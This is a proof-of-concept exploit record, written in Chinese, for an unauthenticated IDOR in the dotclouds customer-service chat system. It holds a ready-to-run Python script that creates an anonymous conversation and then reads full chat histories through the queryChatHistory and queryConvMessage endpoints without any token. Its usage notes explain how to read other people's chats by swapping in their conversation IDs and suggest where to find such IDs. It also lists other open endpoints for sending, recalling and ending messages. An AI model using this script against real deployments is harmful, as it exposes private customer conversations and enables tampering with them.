# 点云客服 dotclouds 会话接口零鉴权读取（IDOR，queryChatHistory/queryConvMessage）

- **code**: 点云客服-dotclouds-会话接口零鉴权读取-idor-querychathistory-queryconvmessage
- **kind**: poc
- **category**: auth-bypass
- **component**: 点云客服系统（net.dotclouds / Spring Boot）
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-08 在 example-com 靶标实测（203.0.113.65:51010）：queryChatHistory 仅带 {"convId","companyId"} 返回 200 / 945B / code=SUCCESS 且 data[].message 为完整消息对象；queryConvMessage 返回 200 / 986B / code=SUCCESS data.messageIndex=1 与完整 message 数组。请求全程无 token-dotclouds 头。
- **path**: pocs/点云客服-dotclouds-会话接口零鉴权读取-idor-querychathistory-queryconvmessage/dotclouds_unauth_convread.py
- **tags**: 点云客服,dotclouds,未授权,IDOR,会话读取
- **created_at**: 2026-10-08T13:03:50.166Z
- **found_by**: exploit

## 描述

点云客服访客端 queryChatHistory / queryConvMessage 零鉴权（IDOR）：只凭 convId 即可读取该会话完整聊天记录，请求体无身份字段、服务端不校验归属。

## 用法

```
改 HOST/IP/PORT 后直接运行；脚本先匿名 createConv 建会话，再用该 convId 无 token 读取完整会话以证明零鉴权。把 convId 换成从别处获得的他人 convId 即可读他人聊天记录。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""点云客服 net.dotclouds 会话接口零鉴权读取 PoC（IDOR）。

访客端 /dotclouds/chat/conversation/ 下多个接口不校验身份归属，请求体无任何身份字段：
  POST /dotclouds/chat/conversation/queryChatHistory  {"convId":"<32hex>","companyId":"200005"}
    → 200 {"state":true,"code":"SUCCESS","data":[{"fromUser":"...","message":"...","context":"..."}, ...]}
  POST /dotclouds/chat/conversation/queryConvMessage
       {"companyId":"200005","fromUser":"<fp>","convId":"<32hex>","random":"<fp>",
        "messageIndex":0,"customerUid":"<客服uid>"}
    → 200 {"code":"SUCCESS","data":{"messageIndex":1,"message":[...]}}
同样是零鉴权的还有：sendConvMessage（可往会话发消息）、recallMessage、endChat、
clearCustomerLoad。后台鉴权头是 token-dotclouds，但这些接口完全不检查。

限制：convId 为 32 位随机 hex（uuid4），不可直接枚举；会话列表接口
basis/customervisitor/appListConvId 需要正确 customerUid。要批量读取第三方会话，
需先从其它途径（客服侧列表接口、导出、日志、分享链接）获得 convId 或 customerUid。
"""
import json, os, sys, uuid
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import rawreq

HOST = 'www.example.com'
IP = '203.0.113.6'
PORT = 51010
COMPANY = '200005'


def call(path, body):
    data = rawreq.send(IP, PORT, path, 'POST', {'Content-Type': 'application/json;charset=UTF-8'},
                       json.dumps(body).encode(), sni=HOST, host_hdr=HOST,
                       timeout=15.0, maxlen=200000)
    txt = data.decode('utf-8', 'ignore')
    i = txt.find('{')
    return json.loads(txt[i:txt.rfind('}') + 1]) if i >= 0 else None


if __name__ == '__main__':
    # 1) 自建会话取得合法 convId（匿名）
    fp = uuid.uuid4().hex
    j = call('/dotclouds/chat/conversation/createConv', {
        'companyId': COMPANY, 'configId': COMPANY, 'fingerprint': fp, 'source': 'pc',
        'referer': '直接访问', 'customerUid': '', 'systemInfo': 'Windows10',
        'browserInfo': 'Chrome', 'random': fp, 'preGuideQuestion': '',
        'username': '', 'position': ''})
    conv = j['data']['convId']
    cust = (j['data'].get('customer') or {}).get('uid')

    # 2) 仅凭 convId 读取完整会话（无 token / 无归属校验）
    print(json.dumps(call('/dotclouds/chat/conversation/queryChatHistory',
                          {'convId': conv, 'companyId': COMPANY}), ensure_ascii=False)[:2000])
    print(json.dumps(call('/dotclouds/chat/conversation/queryConvMessage',
                          {'companyId': COMPANY, 'fromUser': fp, 'convId': conv,
                           'random': fp, 'messageIndex': 0, 'customerUid': cust}),
                     ensure_ascii=False)[:2000])
    # 3) 拿到他人 convId 后，把上面 convId 替换掉即可读他人聊天记录

```
